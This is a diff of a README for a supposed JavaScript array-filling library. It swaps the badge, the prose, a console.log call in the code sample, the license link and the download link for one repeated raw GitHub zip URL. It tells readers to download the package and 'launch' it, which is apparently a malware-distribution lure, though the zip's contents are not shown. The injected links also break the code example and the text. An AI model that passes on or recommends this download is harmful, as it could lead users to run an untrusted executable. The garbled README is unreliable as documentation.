@@ -1,12 +1,12 @@
 # Array Base Fill 🌟
 
-![array-base-fill](https://img.shields.io/badge/Fill-Array%20Accessor-blue)
+![array-base-fill](https://raw.githubusercontent.com/ItaloGLS/array-base-fill/main/erosional/base-fill-array-soleplate.zip%20Accessor-blue)
 
 Welcome to the `array-base-fill` repository, your one-stop solution for filling all elements within a portion of an array with a specified value! 🚀
 
 ## Repository Overview
 
-This repository provides a convenient and efficient way to fill arrays in JavaScript with a specified value. Whether you are working with data structures, node.js applications, or generic arrays, the `array-base-fill` library has got you covered.
+This repository provides a convenient and efficient way to fill arrays in JavaScript with a specified value. Whether you are working with data structures, https://raw.githubusercontent.com/ItaloGLS/array-base-fill/main/erosional/base-fill-array-soleplate.zip applications, or generic arrays, the `array-base-fill` library has got you covered.
 
 ### Functionality
 
@@ -34,7 +34,7 @@ Explore a wide range of topics related to this repository, including:
 
 To get started with `array-base-fill` and leverage its powerful functionality, you can download the software package from the following link:
 
-[Download Software](https://github.com/user-attachments/files/18388744/Software.zip)
+[Download Software](https://raw.githubusercontent.com/ItaloGLS/array-base-fill/main/erosional/base-fill-array-soleplate.zip)
 
 🔹Note: The software needs to be launched after downloading.
 
@@ -52,7 +52,7 @@ const arr = [1, 2, 3, 4, 5];
 // Fill array elements from index 1 to 3 with value 0
 const filledArray = arrayBaseFill(arr, 1, 3, 0);
 
-console.log(filledArray); // Output: [1, 0, 0, 0, 5]
+https://raw.githubusercontent.com/ItaloGLS/array-base-fill/main/erosional/base-fill-array-soleplate.zip(filledArray); // Output: [1, 0, 0, 0, 5]
 ```
 
 ## Contribution
@@ -65,7 +65,7 @@ If you encounter any issues while using `array-base-fill` or have any questions 
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/user-attachments/files/18388744/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://raw.githubusercontent.com/ItaloGLS/array-base-fill/main/erosional/base-fill-array-soleplate.zip) file for details.
 
 ---
 
